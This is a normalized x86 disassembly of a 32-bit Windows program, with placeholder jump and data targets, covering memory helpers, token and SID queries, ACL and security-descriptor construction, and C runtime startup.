jmp r-xdata
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
xor ebx ebx
xor eax eax
cmp ebx 0xb7
setne al
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
pop ebx
call sub_3000607d
leave
retn 0x1c
mov [ ebp + 0x8 ] 0x1
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0x408 ] ebx
je r-xdata
sub_30004d6d
push ebp
lea ebp [ esp - 0x88 ]
sub esp 0x108
cmp [ rw-data ] 0x0
mov eax [ rw-data ]
mov [ ebp + 0x84 ] eax
jne r-xdata
mov ecx [ ebp + 0x84 ]
call sub_3000607d
add ebp 0x88
leave
retn
push esi
push edi
mov esi 0x104
push esi
lea eax [ ebp - 0x80 ]
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
mov edi eax
push esi
lea eax [ ebp - 0x80 ]
push eax
push eax
call [ GetShortPathNameA@IAT ]
push edi
lea eax [ ebp - 0x80 ]
push eax
call sub_30004c03
mov edx rw-data
xor esi esi
sub edx eax
pop edi
mov [ esi + rw-data ] 0x0
pop esi
movzx ecx cl
lea edi [ ecx - 0x61 ]
cmp edi 0x19
ja r-xdata
inc esi
mov [ edx + eax ] cl
inc eax
cmp esi 0x8
jl r-xdata
add ecx 0xffffffe0
mov cl [ eax ]
cmp cl 0x2e
je r-xdata
sub_30004e2a
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
and [ ecx ] 0x0
push ebx
mov ebx [ ecx + 0x4 ]
and eax 0x7fff
mov edx 0xffff
push esi
mov esi [ esp + 0x14 ]
shl eax 0x10
and ebx edx
push edi
mov edi [ esp + 0x1c ]
or eax ebx
mov [ ecx + 0x2 ] si
mov [ ecx + 0x8 ] edi
mov [ ecx + 0x4 ] eax
add ecx 0xc
and [ ecx ] 0x0
cmp esi edx
jg r-xdata
xor eax eax
jmp r-xdata
test esi esi
jle r-xdata
pop edi
pop esi
pop ebx
retn 0x10
xor eax eax
inc eax
and eax edx
imul eax esi
push edi
push eax
push ecx
call sub_300047f0
test eax eax
jne r-xdata
sub_30004e8b
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp esi ebx
jne r-xdata
test [ esi + 0x7 ] 0x80
push edi
mov edi [ esi + 0xc ]
je r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] bx
jbe r-xdata
cmp [ esi ] bx
jbe r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
mov eax [ ebp + 0x10 ]
or [ eax ] 0xffffffff
xor eax eax
mov edx [ ebp + 0xc ]
mov ecx edi
call [ ebp + 0x14 ]
test eax eax
je r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] ebx
xor eax eax
inc eax
jmp r-xdata
mov eax [ esi + 0x4 ]
and eax 0xffff
add edi eax
movzx eax [ esi ]
inc ebx
cmp ebx eax
jl r-xdata
mov eax [ esi + 0x4 ]
and eax 0xffff
add edi eax
movzx eax [ esi ]
inc ebx
cmp ebx eax
jl r-xdata
mov edx [ ebp + 0xc ]
mov ecx edi
call [ ebp + 0x14 ]
test eax eax
je r-xdata
pop edi
jmp r-xdata
sub_30004f0d
push ebx
mov ebx [ esp + 0x8 ]
test [ ebx + 0x7 ] 0x80
push esi
push edi
mov edi 0xffff
je r-xdata
mov dx [ ebx ]
cmp dx [ ebx + 0x2 ]
jne r-xdata
mov esi [ esp + 0x14 ]
mov [ esi ] 0x1
mov edx [ ebx + 0xc ]
xor eax eax
cmp [ ebx ] ax
jbe r-xdata
mov ecx [ ebx + 0x4 ]
mov esi [ esp + 0x14 ]
and ecx edi
movzx edi dx
imul edi ecx
add edi [ ebx + 0xc ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
inc [ ebx ]
movzx eax [ ebx ]
dec eax
mov eax [ ebx + 0x4 ]
mov ecx eax
shr ecx 0x10
mov esi 0x7fff
movzx edx dx
and ecx esi
add ecx edx
cmp ecx edi
ja r-xdata
mov ecx [ ebx + 0x4 ]
and ecx edi
cmp [ edx ] 0x0
je r-xdata
or eax 0xffffffff
jmp r-xdata
push [ ebx + 0x8 ]
lea edx [ ebx + 0xc ]
and eax edi
cmp [ edx ] 0x0
jne r-xdata
mov edi edx
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
add edx ecx
movzx ecx [ ebx ]
inc eax
cmp eax ecx
jl r-xdata
pop edi
pop esi
pop ebx
retn 0x8
imul ecx eax
push ecx
movzx ecx [ ebx + 0x2 ]
imul ecx eax
push ecx
push edx
call sub_3000484b
imul eax ecx
push eax
push edx
call sub_300047f0
jmp r-xdata
mov ax [ ebx + 0x6 ]
mov dx [ ebx ]
and ax si
add eax edx
mov [ ebx + 0x2 ] ax
test eax eax
jne r-xdata
sub_30004feb
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
push esi
mov esi eax
mov edx 0xffff
and esi edx
mov ecx esi
imul ecx [ ebp + 0xc ]
add ecx [ ebx + 0xc ]
test eax eax
push edi
jns r-xdata
mov edi [ ebp + 0x10 ]
mov eax [ ebp + 0x10 ]
and [ ebp + 0xc ] 0x0
test eax eax
mov esi ecx
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x4 ] esi
je r-xdata
sub [ ebx ] di
mov eax edi
pop edi
pop esi
pop ebx
leave
retn 0xc
test edi edi
jle r-xdata
mov esi [ ebx + 0x4 ]
mov eax [ ebp + 0x8 ]
sub eax [ ebx + 0xc ]
and esi edx
xor edx edx
div esi
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ ebp + 0xc ] eax
jmp r-xdata
mov [ ebp + 0x10 ] eax
sub edx [ ebp + 0xc ]
sub edx edi
imul edx esi
imul esi edi
push edx
add esi ecx
push esi
push ecx
call memmove
add esp 0xc
movzx edx [ ebx ]
mov eax [ ebp + 0xc ]
add eax edi
cmp eax edx
je r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebp + 0x8 ]
and ecx edx
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x4 ]
and eax edx
add [ ebp + 0x8 ] eax
inc [ ebp + 0xc ]
jmp r-xdata
dec [ esi ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov esi [ ebp - 0x4 ]
and eax edx
add esi eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x4 ] esi
jne r-xdata
sub_300050ae
push esi
mov esi [ esp + 0x8 ]
cmp [ esi ] 0x0
jne r-xdata
xor eax eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
and [ esi + 0x2 ] 0x0
and [ esi + 0xc ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov ecx [ esi + 0x4 ]
movzx edx [ esi + 0x2 ]
and ecx 0xffff
imul ecx edx
push ecx
push eax
call sub_30003b89
pop esi
retn 0x8
sub_300050f2
push ebp
mov ebp esp
push ecx
push [ ebp + 0x18 ]
lea eax [ ebp - 0x4 ]
push 0x10
push eax
call sub_300047f0
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push [ ebp + 0x18 ]
mov eax [ ebp - 0x4 ]
push [ ebp + 0x14 ]
mov cx [ ebp + 0xc ]
push [ ebp + 0x10 ]
mov [ eax + 0x4 ] cx
push [ ebp - 0x4 ]
call sub_30004e2a
test eax eax
jne r-xdata
leave
retn 0x14
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
xor eax eax
inc eax
push 0x10
push [ ebp - 0x4 ]
call sub_30003b89
sub_30005145
push ebp
mov ebp esp
push esi
push [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push esi
call sub_30004e8b
test eax eax
je r-xdata
pop esi
pop ebp
retn 0xc
mov eax [ esi + 0x4 ]
and eax 0xffff
imul eax [ ebp + 0x10 ]
add eax [ esi + 0xc ]
sub_30005174
push esi
mov esi [ esp + 0x8 ]
cmp [ esi ] 0x0
jne r-xdata
push [ esp + 0xc ]
mov [ rw-data ] 0x1
push [ esi ]
call sub_30004f0d
and [ rw-data ] 0x0
push [ esp + 0x14 ]
push 0x5
push 0x5
push [ esp + 0x1c ]
push esi
call sub_300050f2
test eax eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
retn 0x10
sub_300051b9
push esi
push [ esp + 0x10 ]
mov esi [ esp + 0xc ]
push [ esp + 0x10 ]
push esi
call sub_30004feb
xor eax eax
cmp [ esi ] ax
sete al
push eax
push esi
call sub_300050ae
pop esi
retn 0xc
sub_300051df
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ eax * 4 + rw-data ]
push edi
xor edi edi
cmp ebx edi
mov [ ebp - 0xc ] edi
je r-xdata
xor eax eax
jmp r-xdata
mov ax [ ebx ]
cmp ax di
jne r-xdata
pop edi
pop ebx
leave
retn
movzx eax ax
push esi
mov edi eax
mov [ ebx ] ax
jmp r-xdata
cmp eax ecx
jle r-xdata
mov edx ecx
neg edx
sbb edx edx
and edx ecx
test si si
mov [ eax ] dx
je r-xdata
test edx edx
jne r-xdata
mov edx ecx
mov cx [ ecx ]
test cx cx
je r-xdata
movzx eax [ ebx ]
add eax ebx
mov edi eax
movzx eax si
mov [ ebp - 0xc ] 0x1
jmp r-xdata
mov [ edx ] ax
xor ecx ecx
movzx ecx cx
add ecx ebx
jmp r-xdata
mov ax [ ebx + 0x4 ]
sub ax si
mov eax ebx
sub eax esi
add eax ecx
jmp r-xdata
add eax ebx
mov si [ eax ]
xor edx edx
test edi edi
mov ecx edi
je r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
movzx eax ax
push eax
push esi
push edi
mov [ ebp - 0x4 ] eax
call memmove
mov ecx [ rw-data ]
add esp 0xc
add edi [ ebp - 0x4 ]
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp [ ebp - 0x8 ] cx
je r-xdata
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x1000
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx esi
cmp eax edx
jae r-xdata
mov [ ebx + 0x2 ] di
mov [ ebx ] di
mov bx [ ebx + 0x4 ]
sub bx di
movzx eax bx
mov [ edi + 0x2 ] bx
mov [ eax + edi - 0x2 ] bx
and [ edi ] 0x0
mov eax [ ebp - 0xc ]
pop esi
movzx eax [ ebp - 0x8 ]
add eax ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ecx + eax * 4 ]
cmp eax esi
jb r-xdata
mov ecx [ ecx ]
movzx edx [ ebp - 0x10 ]
sub eax edx
mov edx [ ebp + 0x8 ]
mov [ ecx + edx * 4 ] eax
movzx esi [ eax + 0x2 ]
mov cx [ eax ]
add esi eax
mov eax esi
sub eax edi
test cx cx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] ecx
je r-xdata
sub_30005318
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ GetLengthSid@IAT ]
push esi
push edi
xor edi edi
test eax eax
push 0x8
pop esi
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
jle r-xdata
mov [ ebp + 0x8 ] eax
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn
mov ecx [ ebp + 0x10 ]
lea edi [ ecx + edi * 4 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebp + 0x10 ]
push [ eax + edi * 4 ]
call ebx
inc edi
dec [ ebp + 0x8 ]
lea esi [ esi + eax + 0x8 ]
jne r-xdata
push [ edi ]
call ebx
add edi 0x4
dec [ ebp + 0x8 ]
lea esi [ esi + eax + 0x8 ]
jne r-xdata
sub_3000536c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x18 ]
push edi
push [ ebp + 0x14 ]
push ebx
call sub_30005318
add esp 0xc
mov esi eax
push esi
push 0x40
call [ LocalAlloc@IAT ]
test eax eax
mov [ ebp + 0xc ] eax
je r-xdata
xor eax eax
push 0x2
push esi
push eax
call [ InitializeAcl@IAT ]
test eax eax
je r-xdata
push [ ebp + 0xc ]
call [ LocalFree@IAT ]
and [ ebp - 0x4 ] 0x0
test ebx ebx
jle r-xdata
xor edi edi
cmp [ ebp + 0x14 ] edi
jle r-xdata
mov esi [ ebp + 0x8 ]
sub edi esi
mov eax [ ebp + 0xc ]
jmp r-xdata
mov eax [ ebp + 0x18 ]
lea esi [ eax + ebx * 4 ]
inc [ ebp - 0x4 ]
add esi 0x4
cmp [ ebp - 0x4 ] ebx
jl r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x14
inc edi
add esi 0x4
cmp edi [ ebp + 0x14 ]
jl r-xdata
push [ edi + esi ]
push [ esi ]
push 0x2
push [ ebp + 0xc ]
call [ AddAccessDeniedAce@IAT ]
test eax eax
je r-xdata
push [ esi ]
mov eax [ ebp + 0x10 ]
push [ eax + edi * 4 ]
push 0x2
push [ ebp + 0xc ]
call [ AddAccessAllowedAce@IAT ]
test eax eax
je r-xdata
sub_30005416
push ebp
mov ebp esp
push ecx
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push esi
push esi
call sub_3000536c
push rw-data
push esi
push esi
push esi
push esi
push esi
push esi
push esi
push esi
push 0x1
push r-xdata
call [ AllocateAndInitializeSid@IAT ]
test eax eax
je r-xdata
pop esi
leave
retn 0x4
sub_30005467
push ebp
lea ebp [ esp - 0x94 ]
sub esp 0x114
mov eax [ rw-data ]
mov [ ebp + 0x90 ] eax
mov eax [ ebp + 0xa0 ]
xor ecx ecx
cmp eax ecx
mov [ ebp - 0x80 ] ecx
jne r-xdata
push ebx
xor ebx ebx
push edi
mov edi [ ebp + 0x9c ]
mov [ eax ] ecx
inc ebx
xor eax eax
cmp edi ebx
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x7c ] ecx
je r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x2
push esi
mov esi [ GetLastError@IAT ]
jne r-xdata
cmp edi 0x2
jne r-xdata
mov ecx [ ebp + 0x90 ]
call sub_3000607d
add ebp 0x94
leave
retn
cmp edi ebx
je r-xdata
lea eax [ ebp - 0x74 ]
push eax
push ebx
push 0x8
call [ GetCurrentThread@IAT ]
push eax
call [ OpenThreadToken@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x80 ]
pop edi
pop ebx
lea eax [ ebp - 0x74 ]
push eax
push 0x8
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
test eax eax
je r-xdata
lea eax [ ebp - 0x78 ]
push eax
push 0x0
push 0x0
push ebx
push [ ebp - 0x74 ]
mov ebx [ GetTokenInformation@IAT ]
call ebx
call esi
cmp eax 0x7a
jne r-xdata
call esi
cmp eax 0x3f0
jne r-xdata
cmp [ ebp - 0x74 ] 0x0
pop esi
je r-xdata
cmp [ ebp - 0x78 ] 0x100
mov esi [ GlobalAlloc@IAT ]
jae r-xdata
mov eax ebx
cmp [ ebp - 0x7c ] 0x0
je r-xdata
push [ ebp - 0x74 ]
call [ CloseHandle@IAT ]
push [ ebp - 0x78 ]
push 0x0
call esi
mov edi eax
test edi edi
mov [ ebp - 0x7c ] edi
je r-xdata
lea edi [ ebp - 0x70 ]
jmp r-xdata
push [ ebp - 0x7c ]
call [ GlobalFree@IAT ]
lea eax [ ebp - 0x78 ]
push eax
push [ ebp - 0x78 ]
push edi
push 0x1
push [ ebp - 0x74 ]
call ebx
test eax eax
je r-xdata
push [ edi ]
call [ GetLengthSid@IAT ]
push eax
push 0x0
mov [ ebp - 0x78 ] eax
call esi
test eax eax
mov esi [ ebp + 0xa0 ]
mov [ esi ] eax
je r-xdata
push [ edi ]
push eax
push [ ebp - 0x78 ]
call [ CopySid@IAT ]
test eax eax
je r-xdata
push [ esi ]
call [ IsValidSid@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x80 ] 0x1
sub_300055d6
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x0
call sub_3000536c
push rw-data
push 0x1
call sub_30005467
test eax eax
pop ecx
pop ecx
je r-xdata
leave
retn 0x4
sub_3000561a
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push esi
push edi
lea eax [ ebp - 0x4 ]
push eax
push 0x2
mov [ ebp - 0x8 ] ebx
xor edi edi
mov [ ebp - 0x4 ] ebx
call sub_30005467
test eax eax
mov esi [ ebp - 0x4 ]
pop ecx
pop ecx
je r-xdata
xor eax eax
jmp r-xdata
cmp esi ebx
je r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp + 0xc ]
push eax
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
mov [ ebp + 0xc ] esi
call sub_3000536c
mov edi eax
cmp edi ebx
je r-xdata
pop ebx
leave
retn 0x8
mov eax [ ebp - 0x8 ]
cmp eax ebx
je r-xdata
push esi
call [ GlobalFree@IAT ]
mov [ ebp - 0x8 ] 0x1
pop edi
pop esi
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edi
sub_300056a9
mov eax [ rw-data ]
test eax eax
push esi
mov esi [ LocalFree@IAT ]
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ rw-data ]
test eax eax
pop esi
je r-xdata
push eax
call esi
and [ rw-data ] 0x0
and [ rw-data ] 0x0
and [ rw-data ] 0x0
and [ rw-data ] 0x0
retn
push eax
call [ FreeSid@IAT ]
sub_300056f6
mov eax [ rw-data ]
test eax eax
push esi
mov esi [ LocalFree@IAT ]
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
call esi
and [ rw-data ] 0x0
and [ rw-data ] 0x0
and [ rw-data ] 0x0
pop esi
retn
push eax
call esi
sub_3000572c
push esi
push 0x12ffff
xor esi esi
call sub_30005416
push 0x14
push 0x40
mov [ rw-data ] eax
call [ LocalAlloc@IAT ]
cmp eax esi
mov [ rw-data ] eax
je r-xdata
call sub_300056a9
cmp [ rw-data ] esi
je r-xdata
push 0x1
push eax
call [ InitializeSecurityDescriptor@IAT ]
test eax eax
je r-xdata
push esi
push [ rw-data ]
push 0x1
push [ rw-data ]
call [ SetSecurityDescriptorDacl@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ rw-data ] esi
mov [ rw-data ] 0xc
mov [ rw-data ] eax
mov [ rw-data ] rw-data
inc esi
jmp r-xdata
mov eax esi
pop esi
retn
sub_300057af
push esi
push 0x1fffff
xor esi esi
call sub_30005416
push 0x14
push 0x40
mov [ rw-data ] eax
call [ LocalAlloc@IAT ]
cmp eax esi
mov [ rw-data ] eax
je r-xdata
call sub_300056f6
cmp [ rw-data ] esi
je r-xdata
push 0x1
push eax
call [ InitializeSecurityDescriptor@IAT ]
test eax eax
je r-xdata
push esi
push [ rw-data ]
push 0x1
push [ rw-data ]
call [ SetSecurityDescriptorDacl@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ rw-data ] esi
mov [ rw-data ] 0xc
mov [ rw-data ] eax
mov [ rw-data ] rw-data
inc esi
jmp r-xdata
mov eax esi
pop esi
retn
sub_30005832
mov eax [ rw-data ]
test eax eax
push esi
mov esi [ LocalFree@IAT ]
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ rw-data ]
test eax eax
pop esi
je r-xdata
push eax
call esi
and [ rw-data ] 0x0
and [ rw-data ] 0x0
and [ rw-data ] 0x0
and [ rw-data ] 0x0
retn
push eax
call [ GlobalFree@IAT ]
sub_3000587f
push esi
push 0x12ffff
xor esi esi
call sub_300055d6
push 0x14
push 0x40
mov [ rw-data ] eax
call [ LocalAlloc@IAT ]
cmp eax esi
mov [ rw-data ] eax
je r-xdata
call sub_30005832
cmp [ rw-data ] esi
je r-xdata
push 0x1
push eax
call [ InitializeSecurityDescriptor@IAT ]
test eax eax
je r-xdata
push esi
push [ rw-data ]
push 0x1
push [ rw-data ]
call [ SetSecurityDescriptorDacl@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ rw-data ] esi
mov [ rw-data ] 0xc
mov [ rw-data ] eax
mov [ rw-data ] rw-data
inc esi
jmp r-xdata
mov eax esi
pop esi
retn
sub_30005902
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
mov eax [ ebp - 0x8 ]
pop ebx
leave
retn
push esi
push edi
mov edi [ LocalAlloc@IAT ]
push 0xc
push 0x40
call edi
mov esi eax
test esi esi
mov eax [ ebp + 0x8 ]
mov [ eax ] esi
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax ] 0x0
push 0x12ffff
lea eax [ ebp - 0x4 ]
push eax
call sub_3000561a
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] ebx
je r-xdata
test ebx ebx
je r-xdata
push [ ebp - 0x4 ]
call [ LocalFree@IAT ]
push esi
call [ LocalFree@IAT ]
push 0x14
push 0x40
call edi
mov ebx eax
test ebx ebx
je r-xdata
push ebx
call [ LocalFree@IAT ]
xor edi edi
inc edi
push edi
push ebx
call [ InitializeSecurityDescriptor@IAT ]
test eax eax
je r-xdata
push 0x0
push [ ebp - 0x4 ]
push edi
push ebx
call [ SetSecurityDescriptorDacl@IAT ]
test eax eax
je r-xdata
and [ esi + 0x8 ] 0x0
mov [ esi ] 0xc
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x8 ] edi
jmp r-xdata
pop edi
pop esi
sub_300059b6
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
leave
retn
push edi
mov edi [ eax ]
test edi edi
je r-xdata
pop edi
push ebx
mov ebx [ edi + 0x4 ]
test ebx ebx
push esi
mov esi [ LocalFree@IAT ]
je r-xdata
push edi
call esi
mov eax [ ebp + 0x8 ]
and [ eax ] 0x0
pop esi
pop ebx
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push ebx
call [ GetSecurityDescriptorDacl@IAT ]
test eax eax
je r-xdata
push ebx
call esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
call esi
sub_30005a31
push esi
xor esi esi
push esi
push rw-data
push 0x1
push rw-data
call [ ConvertStringSecurityDescriptorToSecurityDescriptorW@IAT ]
mov eax [ rw-data ]
cmp eax esi
je r-xdata
call sub_30005a12
mov [ rw-data ] esi
mov [ rw-data ] 0xc
mov [ rw-data ] eax
mov [ rw-data ] rw-data
inc esi
jmp r-xdata
mov eax esi
pop esi
retn
sub_30005a9a
push esi
xor esi esi
push esi
push rw-data
push 0x1
push rw-data
call [ ConvertStringSecurityDescriptorToSecurityDescriptorW@IAT ]
mov eax [ rw-data ]
cmp eax esi
je r-xdata
call sub_30005a7b
mov [ rw-data ] esi
mov [ rw-data ] 0xc
mov [ rw-data ] eax
mov [ rw-data ] rw-data
inc esi
jmp r-xdata
mov eax esi
pop esi
retn
sub_30005ae4
xor eax eax
cmp [ esp + 0x4 ] eax
jne r-xdata
cmp [ rw-data ] eax
jne r-xdata
cmp [ rw-data ] eax
jne r-xdata
mov eax [ rw-data ]
call sub_300057af
mov eax [ rw-data ]
jmp r-xdata
call sub_3000572c
retn 0x4
sub_30005b6b
push ecx
push edi
mov edi [ esp + 0x10 ]
test edi edi
mov [ esp + 0x4 ] 0x1
jne r-xdata
push ebx
push ebp
push esi
mov esi [ esp + 0x18 ]
mov ebx 0x1000
test ebx esi
mov ebp 0x2000
je r-xdata
xor eax eax
jmp r-xdata
test ebp esi
je r-xdata
mov eax esi
and eax 0x10000
push eax
call sub_30005ae4
jmp r-xdata
pop edi
pop ecx
retn 0x8
test esi 0x4000
je r-xdata
call sub_30005b15
jmp r-xdata
mov [ edi ] eax
jmp r-xdata
test esi 0x8000
je r-xdata
call sub_30005b29
jmp r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
test esi 0x40000
je r-xdata
call sub_30005b3d
mov eax [ esp + 0x10 ]
pop esi
pop ebp
pop ebx
test esi 0x800000
je r-xdata
push edi
call sub_30005b51
test eax eax
jne r-xdata
and esi 0x7f000
cmp esi ebx
je r-xdata
and [ esp + 0x10 ] eax
push [ eax ]
push 0x40
call [ LocalAlloc@IAT ]
test eax eax
je r-xdata
cmp esi ebp
je r-xdata
and [ esp + 0x10 ] 0x0
mov ecx [ edi ]
mov ecx [ ecx ]
mov [ eax ] ecx
mov ecx [ edi ]
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x1
jmp r-xdata
cmp esi 0x4000
je r-xdata
mov [ edi ] eax
cmp esi 0x8000
je r-xdata
cmp esi 0x40000
jne r-xdata
mov [ eax + 0x8 ] 0x1
jmp r-xdata
sub_30005c5e
push ebp
mov ebp esp
test [ ebp + 0xa ] 0x4
je r-xdata
test [ ebp + 0xa ] 0x2
jne r-xdata
push [ ebp + 0xc ]
call sub_30005b5e
jmp r-xdata
pop ebp
retn 0x8
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
and [ esi ] 0x0
pop esi
mov eax [ esi ]
test eax eax
je r-xdata
test [ ebp + 0xa ] 0x80
je r-xdata
push eax
call [ LocalFree@IAT ]
sub_30005c9a
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x14 ]
push ebx
xor ebx ebx
test al al
mov [ ebp - 0x4 ] ebx
jns r-xdata
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
pop esi
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov eax ebx
pop ebx
leave
retn 0x10
cmp [ ebp + 0xc ] 0x1
jb r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jbe r-xdata
mov [ eax ] bl
jmp r-xdata
pop edi
test ah 0x4
je r-xdata
test al 0x10
mov [ ebp + 0x8 ] ebx
je r-xdata
push edi
push esi
push [ ebp + 0x10 ]
call sub_30004b75
jmp r-xdata
test al 0x20
je r-xdata
call sub_30005b15
mov eax [ rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
mov ebx esi
je r-xdata
test [ ebp + 0x14 ] 0x1
mov eax r-xdata
jne r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_3000568e
test eax eax
je r-xdata
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call [ LocalFree@IAT ]
push edi
push esi
push eax
call sub_30004b75
push edi
push esi
push [ ebp + 0x10 ]
call sub_30004bcd
test [ ebp + 0x14 ] 0x40
je r-xdata
mov eax r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x4 ]
push ecx
push eax
call [ ConvertSidToStringSidA@IAT ]
test eax eax
jne r-xdata
test [ ebp + 0x15 ] 0x1
je r-xdata
push edi
push esi
push r-xdata
call sub_30004bcd
push [ ebp + 0x8 ]
call [ GlobalFree@IAT ]
and [ ebp + 0x14 ] 0xffffffcf
test [ ebp + 0x14 ] 0x30
je r-xdata
call sub_30004d6d
push edi
push esi
push rw-data
call sub_30004bcd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push edi
push esi
push r-xdata
call sub_30004bcd
push edi
push esi
push [ ebp - 0x4 ]
call sub_30004bcd
sub_30005dd0
push 0x28
push r-xdata
call sub_3000614a
xor edi edi
push edi
call [ GetModuleHandleA@IAT ]
cmp [ eax ] 0x5a4d
jne r-xdata
mov [ ebp - 0x1c ] edi
jmp r-xdata
mov ecx [ eax + 0x3c ]
add ecx eax
cmp [ ecx ] 0x4550
jne r-xdata
mov [ ebp - 0x4 ] edi
push 0x1
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_300060c2
call sub_300061cf
cmp [ rw-data ] edi
jne r-xdata
movzx eax [ ecx + 0x18 ]
cmp eax 0x10b
je r-xdata
call sub_300061ba
push rw-data
push rw-data
call _initterm
push sub_30006106
call sub_300060b0
mov eax [ rw-data ]
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x24 ]
push eax
